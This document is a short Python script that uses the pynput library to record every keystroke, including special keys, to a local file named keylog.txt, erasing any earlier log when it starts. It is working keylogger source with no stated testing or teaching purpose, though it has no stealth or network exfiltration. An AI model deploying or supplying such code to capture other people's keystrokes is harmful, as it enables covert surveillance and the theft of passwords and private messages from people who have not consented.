from pynput import keyboard
import os

filename = "keylog.txt"

# This function will be called whenever a key is pressed
def on_press(key, filename="keylog.txt"):
    try:
        # Log the key pressed
        with open(filename, "a") as log_file:
            log_file.write(f'{key.char}\n')
    except AttributeError:
        # Handle special keys (like Ctrl, Alt, etc.)
        with open(filename, "a") as log_file:
            log_file.write(f'{key}\n')

path = os.getcwd() + "\\" + filename
if os.path.exists(path):
    os.remove(path)

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
